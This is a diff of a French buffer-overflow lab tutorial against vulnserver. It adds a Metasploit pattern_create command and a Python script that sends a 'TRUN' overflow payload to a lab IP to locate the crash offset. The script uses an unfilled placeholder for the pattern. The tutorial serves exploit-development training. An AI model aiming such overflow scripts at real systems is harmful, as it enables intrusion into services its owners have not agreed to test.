@@ -98,8 +98,47 @@ Ici, on voit que le programme crash à 2000 bytes.
 
 
 On retourne sur notre machine victime et on lance vulnserver attaché à immunity debugger afin de déterminer l'offset pour voir où ça crashe.
-![Immunity Debugger](assets/5.png) POUR NOUS 
+
+
+![Immunity Debugger](assets/5.png) 
+
+Pour nous, le programme crash à 2003 bytes et sur windows : [386F4337]. On va donc chercher l'offset en générant un pattern.
+
 
 ## 4. Chercher l'offset <a name="offset"></a>
 
+on génère un pattern avec metasploit.
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+```
+
+On a trouvé que le programme crash à 2000, on met donc un peu plus (3000) pour être sûr.
+
+voilà le résultat :
+
+![Pattern](assets/4.png)
+
+On va donc envoyer ce pattern au programme vulnérable.
+
+```py
+import sys, socket
+from time import sleep
+
+offset = NotreOffset
+
+try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('192.168.230.150',9999))
+        payload = "TRUN /.:/" + offset
+        s.send((payload.encode()))
+        s.close()
+
+except:
+        print("Error connection to server")
+        sys.exit()
+
+```
+
+On lance le script et on regarde où ça crash.
 
